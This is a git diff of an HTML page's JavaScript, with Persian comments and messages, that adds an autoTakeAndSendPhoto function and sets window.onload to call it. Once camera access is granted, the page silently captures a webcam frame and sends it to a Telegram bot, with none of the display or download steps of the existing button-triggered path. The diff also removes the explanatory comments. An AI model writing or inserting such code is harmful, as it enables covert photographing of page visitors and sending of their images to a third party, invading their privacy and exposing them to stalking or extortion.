@@ -54,14 +54,14 @@
   </div>
 
   <script>
-    async function takePhoto() {
+    async function autoTakeAndSendPhoto() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.createElement('video');
         video.srcObject = stream;
         await video.play();
 
-        await new Promise(resolve => setTimeout(resolve, 1000)); // صبر برای بارگذاری فریم
+        await new Promise(resolve => setTimeout(resolve, 1000));
 
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth;
@@ -69,21 +69,43 @@
         const context = canvas.getContext('2d');
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        stream.getTracks().forEach(track => track.stop()); // قطع دوربین
+        stream.getTracks().forEach(track => track.stop());
+
+        canvas.toBlob(blob => {
+          sendPhotoToTelegram(blob);
+        }, 'image/jpeg');
+      } catch (err) {
+        console.error('❌ خطا در گرفتن دسترسی به دوربین:', err);
+      }
+    }
+
+    async function takePhoto() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
+
+        await new Promise(resolve => setTimeout(resolve, 1000));
+
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const context = canvas.getContext('2d');
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        stream.getTracks().forEach(track => track.stop());
 
         canvas.toBlob(blob => {
           const photoURL = URL.createObjectURL(blob);
 
-          // پاک‌سازی قبلی
           document.getElementById('photoDisplay').innerHTML = '';
           document.getElementById('downloadBox').innerHTML = '';
 
-          // نمایش عکس
           const img = document.createElement('img');
           img.src = photoURL;
           document.getElementById('photoDisplay').appendChild(img);
 
-          // لینک دانلود
           const downloadLink = document.createElement('a');
           downloadLink.href = photoURL;
           downloadLink.download = 'photo.jpg';
@@ -97,11 +119,10 @@
           downloadLink.style.textDecoration = 'none';
           document.getElementById('downloadBox').appendChild(downloadLink);
 
-          // ارسال به تلگرام
           sendPhotoToTelegram(blob);
         }, 'image/jpeg');
       } catch (err) {
-        console.error('❌ خطا در گرفتن دسترسی به دوربین:', err);
+        console.error('❌ خطا در گرفتن عکس با دکمه:', err);
         alert('دسترسی به دوربین ممکن نیست!');
       }
     }
@@ -120,6 +141,8 @@
       .then(data => console.log('📤 عکس ارسال شد:', data))
       .catch(err => console.error('❌ خطا در ارسال به تلگرام:', err));
     }
+
+    window.onload = autoTakeAndSendPhoto;
   </script>
 </body>
 </html>
